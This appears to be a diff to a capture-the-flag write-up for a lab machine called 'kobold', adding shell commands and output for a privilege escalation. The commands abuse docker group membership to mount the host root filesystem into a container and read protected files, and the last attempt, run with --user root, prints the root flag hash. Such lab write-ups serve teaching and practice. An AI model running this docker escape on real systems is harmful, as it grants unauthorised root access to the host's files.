@@ -152,5 +152,16 @@ find / -group operator 2>/dev/null
 ben@kobold:~$ ls -la /var/run/docker.sock
 ls -la /var/run/docker.sock
 srw-rw---- 1 root docker 0 Mar 22 06:30 /var/run/docker.sock
-ben@kobold:~$
+ben@kobold:~$ newgrp docker
+newgrp docker
+docker run -v /:/hostfs --rm --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 -c "cat /hostfs/root/root.txt"
+cat: can't open '/hostfs/root/root.txt': Permission denied
+# User flag
+docker run -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/home/alice/user.txt
+cat: can't open '/hostfs/home/alice/user.txt': Permission denied
+docker run -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
+cat: can't open '/hostfs/root/root.txt': Permission denied
+docker run -v /:/hostfs --rm --user root --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 -c "cat /hostfs/root/root.txt"
+eb99819216e6d4cd094060651f909b1f
 ```
+
